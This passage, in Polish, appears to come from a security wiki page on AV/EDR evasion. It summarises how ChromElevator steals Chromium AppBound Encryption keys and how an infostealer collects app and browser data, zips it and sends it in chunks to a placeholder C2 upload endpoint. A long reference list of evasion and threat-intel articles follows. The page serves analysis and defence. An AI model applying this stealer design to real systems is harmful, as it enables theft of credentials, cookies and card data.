- Procedury ChromElevator wykorzystują direct-syscall reflective process hollowing, by wstrzyknąć kod do działającej przeglądarki Chromium, przejąć klucze AppBound Encryption i odszyfrować hasła/pliki cookie/dane kart kredytowych bezpośrednio z baz SQLite, mimo zabezpieczeń ABE.


### Modularne zbieranie danych w pamięci i eksfiltracja HTTP w porcjach

- `create_memory_based_log` iteruje po globalnej tabeli wskaźników funkcji `memory_generators` i uruchamia jeden wątek dla każdego włączonego modułu (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, rozszerzenia przeglądarek itd.). Każdy wątek zapisuje wyniki we współdzielonych buforach i raportuje liczbę plików po około 45-sekundowym oczekiwaniu na zakończenie wątków.
- Po zakończeniu wszystkie dane są kompresowane biblioteką `miniz` połączoną statycznie, a archiwum zapisywane jako `%TEMP%\\Log.zip`. `ThreadPayload1` odczekuje następnie 15 s i przesyła archiwum strumieniowo w porcjach po 10 MB za pomocą HTTP POST do `http://<C2>:6767/upload`, podszywając się pod przeglądarkowy boundary `multipart/form-data` (`----WebKitFormBoundary***`). Każda porcja zawiera `User-Agent: upload`, `auth: <build_id>` oraz opcjonalnie `w: <campaign_tag>`, a ostatnia porcja dodaje `complete: true`, informując C2 o zakończeniu składania danych.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML-based .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)

{{#include ../banners/hacktricks-training.md}}
